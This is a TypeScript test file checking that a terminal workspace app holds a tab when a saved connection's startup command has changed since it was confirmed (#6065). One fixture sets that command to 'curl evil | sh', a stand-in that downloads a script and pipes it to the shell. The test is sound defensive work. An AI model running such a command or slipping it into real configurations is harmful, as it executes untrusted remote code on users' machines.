/**
 * Opening a workspace whose saved connection changed elsewhere since it was
 * confirmed here holds that tab (#6065).
 */
import { describe, it, expect, beforeEach, vi } from "vitest";

vi.mock("@/themes", () => ({
  applyTheme: vi.fn(),
  onThemeChange: vi.fn(() => vi.fn()),
}));

vi.mock("@/services/workspaceApi", () => ({
  getWorkspaces: vi.fn(() => Promise.resolve([])),
  loadWorkspace: vi.fn(),
  saveWorkspace: vi.fn(() => Promise.resolve()),
  deleteWorkspace: vi.fn(() => Promise.resolve()),
  duplicateWorkspace: vi.fn(() => Promise.resolve("")),
}));

import { useAppStore } from "./appStore";
import { loadWorkspace } from "@/services/workspaceApi";
import { setupConnectionsRegion, seedConnectionsRegion } from "@/test/connectionsHarness";
import { setupSettingsRegion, seedSettings } from "@/test/settingsRegionTestHarness";
import { setupAgentsRegion } from "@/test/agentsRegionTestHarness";
import { layoutState } from "@/test/layoutState";
import { getAllLeaves } from "@/utils/panelTree";
import {
  ensureSavedConnectionBaseline,
  resetSavedConnectionTrustForTest,
} from "@/services/savedConnectionTrust";
import type { SavedConnection } from "@/types/connection";
import type { WorkspaceDefinition } from "@/types/workspace";

setupConnectionsRegion();
setupSettingsRegion();
setupAgentsRegion();

const build = (initialCommand: string): SavedConnection => ({
  id: "Build",
  name: "Build",
  folderId: null,
  config: { type: "local", config: { shell: "bash", initialCommand } },
});
const definition: WorkspaceDefinition = {
  id: "ws",
  name: "Work",
  tabGroups: [{ name: "Main", layout: { type: "leaf", tabs: [{ connectionRef: "Build" }] } }],
};
const openedTab = () => getAllLeaves(layoutState().tabGroups[0].rootPanel)[0].tabs[0];

describe("launchWorkspace — a saved connection changed elsewhere (#6065)", () => {
  beforeEach(async () => {
    useAppStore.setState(useAppStore.getInitialState());
    resetSavedConnectionTrustForTest();
    seedSettings({ workspaceImportAllowlist: [] });
    seedConnectionsRegion({ connections: [build("make")] });
    await ensureSavedConnectionBaseline();
    vi.mocked(loadWorkspace).mockResolvedValue(definition);
  });

  it("holds the tab and shows what it would run", async () => {
    seedConnectionsRegion({ connections: [build("curl evil | sh")] });
    await useAppStore.getState().launchWorkspace("ws");
    expect(openedTab()).toMatchObject({
      pendingImportedConnection: true,
      pendingConnectionChanged: true,
    });
  });

  it("opens an unchanged one as before", async () => {
    await useAppStore.getState().launchWorkspace("ws");
    expect(openedTab().pendingImportedConnection).toBeUndefined();
  });
});
